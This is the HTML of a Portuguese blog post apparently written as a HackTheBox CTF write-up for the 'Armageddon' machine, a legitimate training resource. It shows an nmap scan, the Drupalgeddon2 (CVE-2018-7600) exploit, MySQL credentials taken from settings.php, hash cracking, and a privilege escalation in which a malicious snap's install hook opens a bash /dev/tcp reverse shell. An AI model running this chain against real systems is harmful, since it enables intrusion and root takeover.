@@ -1,0 +1,621 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="Haderach ">
+<meta name="description" content="Neste &amp;lsquo;writeup&amp;rsquo; veremos a resolução da máquina &amp;lsquo;Armageddon&amp;rsquo; do HackTheBox.
+Informações da Máquina IP: 10.10.10.233
+Sistema Operacional: Linux
+Nível de dificuldade: Easy
+Varredura e Enumeração Port Scan Iniciando um scan completo em todas as portas TCP abertas com nmap:
+# Nmap 7.91 scan initiated Sat Jun 26 22:18:58 2021 as: nmap -v -sV -sC -p 22,80 -Pn -oN details.txt 10.10.10.233 Nmap scan report for 10.10.10.233 Host is up (0.37s latency)." />
+<meta name="keywords" content="DCPT,Pentest,CTF,Cybersecurity,RedTeam,HackTheBox, writeup, hackthebox" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="#252627" />
+<link rel="canonical" href="https://brunomcuesta.github.io/posts/2021/08/hackthebox-armageddon/" />
+
+
+    <title>
+        
+            HackTheBox - Armageddon :: Haderach  — Pentest e CTF
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="https://brunomcuesta.github.io/main.031a8efc33f94f55a4071bf4e91596478a5809fc8c148fab113801189cfd2152.css">
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://brunomcuesta.github.io/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://brunomcuesta.github.io/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://brunomcuesta.github.io/favicon-16x16.png">
+    <link rel="manifest" href="https://brunomcuesta.github.io/site.webmanifest">
+    <link rel="mask-icon" href="https://brunomcuesta.github.io/safari-pinned-tab.svg" color="#252627">
+    <link rel="shortcut icon" href="https://brunomcuesta.github.io/favicon.ico">
+    <meta name="msapplication-TileColor" content="#252627">
+    <meta name="theme-color" content="#252627">
+
+
+
+<meta itemprop="name" content="HackTheBox - Armageddon">
+<meta itemprop="description" content="Neste &lsquo;writeup&rsquo; veremos a resolução da máquina &lsquo;Armageddon&rsquo; do HackTheBox.
+Informações da Máquina IP: 10.10.10.233
+Sistema Operacional: Linux
+Nível de dificuldade: Easy
+Varredura e Enumeração Port Scan Iniciando um scan completo em todas as portas TCP abertas com nmap:
+# Nmap 7.91 scan initiated Sat Jun 26 22:18:58 2021 as: nmap -v -sV -sC -p 22,80 -Pn -oN details.txt 10.10.10.233 Nmap scan report for 10.10.10.233 Host is up (0.37s latency).">
+<meta itemprop="datePublished" content="2021-08-20T20:32:28-03:00" />
+<meta itemprop="dateModified" content="2021-08-20T20:32:28-03:00" />
+<meta itemprop="wordCount" content="924">
+<meta itemprop="image" content="https://brunomcuesta.github.io"/>
+
+
+
+<meta itemprop="keywords" content="writeup,hackthebox," />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://brunomcuesta.github.io"/>
+
+<meta name="twitter:title" content="HackTheBox - Armageddon"/>
+<meta name="twitter:description" content="Neste &lsquo;writeup&rsquo; veremos a resolução da máquina &lsquo;Armageddon&rsquo; do HackTheBox.
+Informações da Máquina IP: 10.10.10.233
+Sistema Operacional: Linux
+Nível de dificuldade: Easy
+Varredura e Enumeração Port Scan Iniciando um scan completo em todas as portas TCP abertas com nmap:
+# Nmap 7.91 scan initiated Sat Jun 26 22:18:58 2021 as: nmap -v -sV -sC -p 22,80 -Pn -oN details.txt 10.10.10.233 Nmap scan report for 10.10.10.233 Host is up (0.37s latency)."/>
+
+
+
+
+    <meta property="og:title" content="HackTheBox - Armageddon" />
+<meta property="og:description" content="Neste &lsquo;writeup&rsquo; veremos a resolução da máquina &lsquo;Armageddon&rsquo; do HackTheBox.
+Informações da Máquina IP: 10.10.10.233
+Sistema Operacional: Linux
+Nível de dificuldade: Easy
+Varredura e Enumeração Port Scan Iniciando um scan completo em todas as portas TCP abertas com nmap:
+# Nmap 7.91 scan initiated Sat Jun 26 22:18:58 2021 as: nmap -v -sV -sC -p 22,80 -Pn -oN details.txt 10.10.10.233 Nmap scan report for 10.10.10.233 Host is up (0.37s latency)." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://brunomcuesta.github.io/posts/2021/08/hackthebox-armageddon/" />
+<meta property="og:image" content="https://brunomcuesta.github.io"/>
+<meta property="article:published_time" content="2021-08-20T20:32:28-03:00" />
+<meta property="article:modified_time" content="2021-08-20T20:32:28-03:00" />
+
+
+
+
+
+
+    <meta property="article:published_time" content="2021-08-20 20:32:28 -0300 -03" />
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://brunomcuesta.github.io/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">$ cd /root/</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://brunomcuesta.github.io/about/">About</a></li><li><a href="https://brunomcuesta.github.io/posts/">Posts</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+  <main class="post">
+
+    <div class="post-info">
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
+          <circle cx="12" cy="12" r="10"></circle>
+          <polyline points="12 6 12 12 16 14"></polyline>
+        </svg>
+        5 minutos
+
+        
+      </p>
+    </div>
+
+    <article>
+      <h1 class="post-title">
+        <a href="https://brunomcuesta.github.io/posts/2021/08/hackthebox-armageddon/">HackTheBox - Armageddon</a>
+      </h1>
+
+      
+
+      
+        <hr />
+        <aside id="toc">
+          <div class="toc-title">Índice</div>
+          <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#informações-da-máquina">Informações da Máquina</a></li>
+        <li><a href="#varredura-e-enumeração">Varredura e Enumeração</a></li>
+        <li><a href="#vulnerabilidade">Vulnerabilidade</a></li>
+        <li><a href="#exploração">Exploração</a></li>
+        <li><a href="#escalação-de-privilégios">Escalação de Privilégios</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+        </aside>
+        <hr />
+
+      
+
+      <div class="post-content">
+        
+    <img src="https://i.imgur.com/j1UBIGf.jpg"  alt="Armageddon Cover"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Neste &lsquo;writeup&rsquo; veremos a resolução da máquina &lsquo;Armageddon&rsquo; do <a href="https://www.hackthebox.eu/">HackTheBox</a>.</p>
+<h3 id="informações-da-máquina">Informações da Máquina</h3>
+<p>IP: 10.10.10.233</p>
+<p>Sistema Operacional: Linux</p>
+<p>Nível de dificuldade: Easy</p>
+<h3 id="varredura-e-enumeração">Varredura e Enumeração</h3>
+<h4 id="port-scan">Port Scan</h4>
+<p>Iniciando um scan completo em todas as portas TCP abertas com nmap:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Nmap 7.91 scan initiated Sat Jun 26 22:18:58 2021 as: nmap -v -sV -sC -p 22,80 -Pn -oN details.txt 10.10.10.233</span>
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.233
+Host is up <span style="color:#f92672">(</span>0.37s latency<span style="color:#f92672">)</span>.
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+| ssh-hostkey: 
+|   <span style="color:#ae81ff">2048</span> 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+|   <span style="color:#ae81ff">256</span> 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+|_  <span style="color:#ae81ff">256</span> 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+80/tcp open  http    Apache httpd 2.4.6 <span style="color:#f92672">((</span>CentOS<span style="color:#f92672">)</span> PHP/5.4.16<span style="color:#f92672">)</span>
+|_http-favicon: Unknown favicon MD5: 1487A9908F898326EBABFFFD2407920D
+|_http-generator: Drupal <span style="color:#ae81ff">7</span> <span style="color:#f92672">(</span>http://drupal.org<span style="color:#f92672">)</span>
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+| http-robots.txt: <span style="color:#ae81ff">36</span> disallowed entries <span style="color:#f92672">(</span><span style="color:#ae81ff">15</span> shown<span style="color:#f92672">)</span>
+| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
+| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
+| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
+|_/LICENSE.txt /MAINTAINERS.txt
+|_http-server-header: Apache/2.4.6 <span style="color:#f92672">(</span>CentOS<span style="color:#f92672">)</span> PHP/5.4.16
+|_http-title: Welcome to  Armageddon |  Armageddon
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+<span style="color:#75715e"># Nmap done at Sat Jun 26 22:19:25 2021 -- 1 IP address (1 host up) scanned in 27.48 seconds</span>
+</code></pre></div><h4 id="webserver">Webserver</h4>
+<p>O host possui apenas duas portas abertas, a 22 e a 80. Acessando a porta 80 encontramos a seguinte página.</p>
+
+    <img src="https://i.imgur.com/M9Bo9fS.png"  alt="Armageddon - Página Inicial"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>No robots.txt é possível visualizar diversas URLs liberadas e bloqueadas para indexação.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">http://10.10.10.233/robots.txt
+
+User-agent: *
+Crawl-delay: 10
+# CSS, JS, Images
+Allow: /misc/*.css$
+Allow: /misc/*.css?
+Allow: /misc/*.js$
+Allow: /misc/*.js?
+Allow: /misc/*.gif
+Allow: /misc/*.jpg
+Allow: /misc/*.jpeg
+Allow: /misc/*.png
+Allow: /modules/*.css$
+Allow: /modules/*.css?
+Allow: /modules/*.js$
+Allow: /modules/*.js?
+Allow: /modules/*.gif
+Allow: /modules/*.jpg
+Allow: /modules/*.jpeg
+Allow: /modules/*.png
+Allow: /profiles/*.css$
+Allow: /profiles/*.css?
+Allow: /profiles/*.js$
+Allow: /profiles/*.js?
+Allow: /profiles/*.gif
+Allow: /profiles/*.jpg
+Allow: /profiles/*.jpeg
+Allow: /profiles/*.png
+Allow: /themes/*.css$
+Allow: /themes/*.css?
+Allow: /themes/*.js$
+Allow: /themes/*.js?
+Allow: /themes/*.gif
+Allow: /themes/*.jpg
+Allow: /themes/*.jpeg
+Allow: /themes/*.png
+# Directories
+Disallow: /includes/
+Disallow: /misc/
+Disallow: /modules/
+Disallow: /profiles/
+Disallow: /scripts/
+Disallow: /themes/
+# Files
+Disallow: /CHANGELOG.txt
+Disallow: /cron.php
+Disallow: /INSTALL.mysql.txt
+Disallow: /INSTALL.pgsql.txt
+Disallow: /INSTALL.sqlite.txt
+Disallow: /install.php
+Disallow: /INSTALL.txt
+Disallow: /LICENSE.txt
+Disallow: /MAINTAINERS.txt
+Disallow: /update.php
+Disallow: /UPGRADE.txt
+Disallow: /xmlrpc.php
+# Paths (clean URLs)
+Disallow: /admin/
+Disallow: /comment/reply/
+Disallow: /filter/tips/
+Disallow: /node/add/
+Disallow: /search/
+Disallow: /user/register/
+Disallow: /user/password/
+Disallow: /user/login/
+Disallow: /user/logout/
+# Paths (no clean URLs)
+Disallow: /?q=admin/
+Disallow: /?q=comment/reply/
+Disallow: /?q=filter/tips/
+Disallow: /?q=node/add/
+Disallow: /?q=search/
+Disallow: /?q=user/password/
+Disallow: /?q=user/register/
+Disallow: /?q=user/login/
+Disallow: /?q=user/logout/
+</code></pre></div><p>Com o objetivo de obter mais informações da página foi usado o &lsquo;whatweb&rsquo; para visualizar mais detalhes.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ whatweb http://10.10.10.233
+</code></pre></div><p>A saída do comando revelou que o host está usando um CMS PHP chamado Drupal em sua versão 7.</p>
+<pre><code class="language-textplain" data-lang="textplain">http://10.10.10.233 [200 OK] Apache[2.4.6], Content-Language[en],
+Country[RESERVED][ZZ], Drupal, 
+HTTPServer[CentOS][Apache/2.4.6 (CentOS) PHP/5.4.16], 
+IP[10.10.10.233], JQuery, MetaGenerator[Drupal 7 (http://drupal.org)],
+PHP[5.4.16], PasswordField[pass], PoweredBy[Arnageddon],
+Script[text/javascript], Title[Welcome to  Armageddon |  Armageddon],
+UncommonHeaders[x-content-type-options,x-generator],
+X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/5.4.16]
+</code></pre><h3 id="vulnerabilidade">Vulnerabilidade</h3>
+<p>Com a versão do CMS foi feita a busca por vulnerabilidades e exploits.</p>
+
+    <img src="https://i.imgur.com/ggD5SPz.png"  alt="Google - Drupal Exploit"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>O exploit encontrado é referente a <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7600">CVE-2018-7600</a> e está disponível no <a href="https://github.com/pimps/CVE-2018-7600">github</a>. O exploit permite a um atacante remoto executar arbitrariamente comandos no host (RCE - Remote Code Execution).</p>
+
+    <img src="https://i.imgur.com/U1zMkBR.png"  alt="Github - Drupal 7 Exploit"  class="center"  style="border-radius: 8px;"  />
+
+
+<h3 id="exploração">Exploração</h3>
+<p>Clonando o projeto para a máquina local.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ git clone https://github.com/pimps/CVE-2018-7600.git
+</code></pre></div><p>Executando o script em python para efetuar o RCE (Remote Code Execution).</p>
+
+    <img src="https://i.imgur.com/125h1zN.png"  alt="Execução do exploit"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Também existe um exploit no <a href="https://www.exploit-db.com/exploits/44449">exploitdb</a> que permite obter um &lsquo;reverse shell&rsquo; através do metasploit.</p>
+
+    <img src="https://i.imgur.com/jQcUYiI.png"  alt="Metasploit Drupalgeddon2"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Com o metasploit foi possível visualizar os arquivos de configuração da aplicação e obter as credenciais do banco Mysql. O caminho para o arquivo de configuração do Drupal pode ser obtido consultando a sua <a href="https://www.drupal.org/docs/7/install/step-3-create-settingsphp-and-the-files-directory">doc</a> oficial.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">/var/www/html/sites/default/cat settings.php
+</code></pre></div>
+    <img src="https://i.imgur.com/t0LN8uD.png"  alt="Drupal Settings"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Credenciais do banco Mysql.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">drupaluser:CQHEy@9M*m23gBVj
+</code></pre></div><p>Conectando ao banco de dados com as credenciais se obtêm os usuários e senhas cadastrados.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ mysql -u drupaluser -e <span style="color:#e6db74">&#39;use drupal;show tables;select name, pass from users;&#39;</span> -p
+</code></pre></div>
+    <img src="https://i.imgur.com/hCufwve.png"  alt="Usuários e senhas Mysql"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Identificando o tipo de &lsquo;hash&rsquo; usada para cadastrar a senha no banco Mysql com o hashcat.</p>
+
+    <img src="https://i.imgur.com/Cpu6Zzq.png"  alt="Hashcat format"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Efetuando a quebra de &lsquo;hash&rsquo; com hashcat.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ hashcat -m <span style="color:#ae81ff">7900</span> hash /usr/share/wordlists/rockyou.txt --force
+</code></pre></div><p>A senha encontrada é &ldquo;booboo&rdquo;.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">brucetherealadmin:booboo
+</code></pre></div><p>Conectando via SSH com as credenciais válidas e obtendo a flag do user.</p>
+
+    <img src="https://i.imgur.com/Aq0a7W3.png"  alt="User flag"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Obtendo a versão do sistema operacional.</p>
+
+    <img src="https://i.imgur.com/6AAfVov.png"  alt="Versão OS"  class="center"  style="border-radius: 8px;"  />
+
+
+<h3 id="escalação-de-privilégios">Escalação de Privilégios</h3>
+<p>Um procedimento muito usual para escalar privilégios e verificar as permissões do usuário com o sudo. Ao rodar o &lsquo;sudo -l&rsquo; é confirmado que o usuário possui privilégios de root com o &lsquo;snap&rsquo;. Pacotes snaps não necessitam ser instalados na máquina para serem executados.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/snap install *
+</code></pre></div><p>Verificando a versão do snap instalado no sistema.</p>
+
+    <img src="https://i.imgur.com/pBk3Ybl.png"  alt="Versão do Snap"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>No <a href="https://gtfobins.github.io/gtfobins/snap/#sudo">GTFOBins</a> foi encontrada a forma de abusar do snap com o sudo.</p>
+
+    <img src="https://i.imgur.com/wAsAXaW.png"  alt="GTFOBins snap sudo"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Antes de gerar o pacote snap malicioso deve-se instalar o fpm na máquina local seguindo o seu <a href="https://fpm.readthedocs.io/en/latest/installing.html">manual</a>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo gem install --no-document fpm
+$ sudo apt install squashfs-tools
+</code></pre></div><p>Criando o script makesnap.sh para gerar o pacote snap. O script possui uma linha de código que é o comando de &lsquo;reverse shell&rsquo;.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">  <span style="color:#75715e">#!/bin/bash</span>
+  
+  COMMAND<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1&#39;&#34;</span>
+  cd <span style="color:#66d9ef">$(</span>mktemp -d<span style="color:#66d9ef">)</span>
+  mkdir -p meta/hooks
+  printf <span style="color:#e6db74">&#39;#!/bin/bash\n%s;&#39;</span> <span style="color:#e6db74">&#34;</span>$COMMAND<span style="color:#e6db74">&#34;</span> &gt; meta/hooks/install
+  chmod +x meta/hooks/install
+  fpm -n root -s dir -t snap -a all meta
+</code></pre></div><p>Executando o script.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ chmod +x makesnap.sh
+$ ./makesnap.sh
+</code></pre></div><p>O script vai gerar uma pasta no diretório /tmp. Este diretório deve ser compartilhado para poder subir o arquivo .snap ao host.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python3 -m http.server &lt;port&gt;
+</code></pre></div><p>No host foi usado o wget para fazer a transferência do arquivo.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ wget http://&lt;ip&gt;:&lt;port&gt;/xxxx_1.0_all.snap
+</code></pre></div><p>Abrindo a porta local para receber o &lsquo;reverse shell&rsquo;.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ rlwrap nc -lvnp &lt;port&gt;
+</code></pre></div><p>Após abrir a porta local o passo seguinte é executar o comando de instalação do pacote malicioso com o sudo.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo snap install xxxx_1.0_all.snap --dangerous --devmode
+</code></pre></div><p>Recebendo o &lsquo;reverse shell&rsquo; com a shell do root.</p>
+
+    <img src="https://i.imgur.com/MYKIwZ2.png"  alt="Root Reverse Shell"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Obtendo a &lsquo;flag&rsquo; do usuário root.</p>
+
+    <img src="https://i.imgur.com/Ig3Zjib.png"  alt="Root Flag"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Até a próxima!</p>
+
+      </div>
+    </article>
+
+    <hr />
+
+    <div class="post-info">
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="https://brunomcuesta.github.io/tags/writeup/">writeup</a></span>
+        <span class="tag"><a href="https://brunomcuesta.github.io/tags/hackthebox/">hackthebox</a></span>
+        
+    </p>
+
+      
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        924 Palavras
+      </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        
+          20-08-2021 20:32
+        
+
+         
+          
+        
+      </p>
+    </div>
+      <hr />
+      <div class="sharing-buttons">
+        
+<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fbrunomcuesta.github.io%2fposts%2f2021%2f08%2fhackthebox-armageddon%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
+  <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2fbrunomcuesta.github.io%2fposts%2f2021%2f08%2fhackthebox-armageddon%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
+  <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
+      <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=HackTheBox%20-%20Armageddon&amp;caption=HackTheBox%20-%20Armageddon&amp;canonicalUrl=https%3a%2f%2fbrunomcuesta.github.io%2fposts%2f2021%2f08%2fhackthebox-armageddon%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
+  <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
+    <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="mailto:?subject=HackTheBox%20-%20Armageddon&amp;body=https%3a%2f%2fbrunomcuesta.github.io%2fposts%2f2021%2f08%2fhackthebox-armageddon%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
+  <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2fbrunomcuesta.github.io%2fposts%2f2021%2f08%2fhackthebox-armageddon%2f&amp;media=https%3a%2f%2fbrunomcuesta.github.io%2fposts%2f2021%2f08%2fhackthebox-armageddon%2f;description=HackTheBox%20-%20Armageddon" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
+  <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
+    </div>
+  </div>
+</a>
+
+
